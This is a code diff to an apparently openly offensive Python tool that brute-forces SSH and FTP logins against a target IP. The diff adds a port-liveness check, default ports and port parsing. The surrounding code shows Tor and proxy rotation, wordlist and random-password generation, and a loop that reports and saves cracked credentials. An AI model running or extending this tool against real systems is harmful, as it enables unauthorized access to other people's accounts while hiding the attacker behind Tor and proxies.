@@ -33,6 +33,19 @@ def generate_random_password_list(num_passwords=100000):
             tmp.write(password + "\n")
         return tmp.name
 
+
+def is_service_running(ip, port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(5)  # Set a timeout for the connection attempt
+
+    try:
+        sock.connect((ip, port))
+        return True
+    except (ConnectionRefusedError, socket.timeout):
+        return False
+    finally:
+        sock.close()
+
 def set_up_tor():
     print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} INITIALIZING TOR PROXY...")
 
@@ -79,7 +92,7 @@ def load_usernames_from_file(filename):
 def parse_arguments():
     parser = argparse.ArgumentParser(description='Brute force against SSH and FTP services.')
     parser.add_argument('--service', nargs='+', required=True,
-                        help="Service to attack, FTP or SSH. Specify port number by providing interger value")
+                        help="Service to attack. Choose 'ftp' or provide an integer value for the port.")
 
     group = parser.add_mutually_exclusive_group(required=True)
     group.add_argument('-w', '--wordlist', help="Password Wordlist.")
@@ -91,16 +104,22 @@ def parse_arguments():
     args = parser.parse_args()
 
     if len(args.service) > 1:
-        args.service = tuple(args.service)
+        args.service = (args.service[0], int(args.service[1]))
+    else:
+
+        if args.service[0] == 'ftp':
+            args.service = ('ftp', 21)  # Default FTP port is 21
+        elif args.service[0] == 'ssh':
+            args.service = ('ssh', 22)  # Default SSH port is 22
     if args.wordlist and args.rand:
         parser.error("You can't use both -w and -r at the same time. Choose one.")
     elif not args.wordlist and not args.rand:
         parser.error("You must provide one of -w or -r.")
     if isinstance(args.service, list) and len(args.service) > 1:
-        # If it's a list with more than one element, it means both service and port were provided.
+
         args.service = tuple(args.service)
     elif len(args.service) == 1:
-        # If it's a list with a single element, it means only service was provided.
+
         args.service = args.service[0]
     return args
 
@@ -121,7 +140,7 @@ def test_ssh_auth_type(ip):
         pass
 
     try:
-        # This connection attempt will fail, but it serves as a test for password prompt
+
         client.connect(ip, password="invalidpasswordfortesting", look_for_keys=False, allow_agent=False, timeout=5)
         return "Password authentication"
     except paramiko.AuthenticationException:
@@ -226,6 +245,23 @@ def load_proxies_from_file(filename):
         print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} {Fore.RED}  EOFError encountered when reading proxies from file.")
         return []
 
+
+def get_port(args):
+    if len(args.service) > 1:
+        try:
+            return int(args.service[1])
+        except ValueError:
+            print(f"{Fore.RED}ERROR: Invalid port specified.")
+            exit(1)
+    elif args.service[0] == 'ssh':
+        return 22
+    elif args.service[0] == 'ftp':
+        return 21
+    else:
+        return None
+
+
+
 if __name__ == '__main__':
     try:
         print(current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} STARTING ATTACK...")
@@ -235,7 +271,7 @@ if __name__ == '__main__':
         time.sleep(0.5)
         args = parse_arguments()
         service = args.service[0]
-        port = args.service[1] if len(args.service) > 1 else None
+        port = get_port(args)
         if args.rand:
             args.wordlist = generate_random_password_list()
 
@@ -251,10 +287,21 @@ if __name__ == '__main__':
             print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Service: {Fore.YELLOW}{service}{Fore.RESET}")
             print(
                 f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Port: {Fore.YELLOW}{port}{Fore.RESET}")
+            if not is_service_running(args.ip, port):
+                print(f"{Fore.RED}ERROR: No service running on the specified port.")
+                exit(1)
+
+
         else:
             print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Service: {Fore.YELLOW}{service}{Fore.RESET}")
             print(
                 f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Port: {Fore.YELLOW}{port}{Fore.RESET}")
+
+
+
+
+
+
         proxies = []
         if args.proxies:
             print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Loading proxies from file ....")
@@ -319,7 +366,7 @@ if __name__ == '__main__':
                             port = 22
 
                         if handle_timeout(ssh_attack, args.ip, port, user, password, proxy_ip, proxy_port):
-                            # Updated this line
+
                             print(
                                 f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Password found for [*]{user}[*] in [{time_elapsed:.2f} seconds] with [{attempt_count} tries]. PASS = {Fore.BLUE}{password} ")
                             save_to_file(args.ip, args.service, user, password, attempt_count)  # Added attempt_count
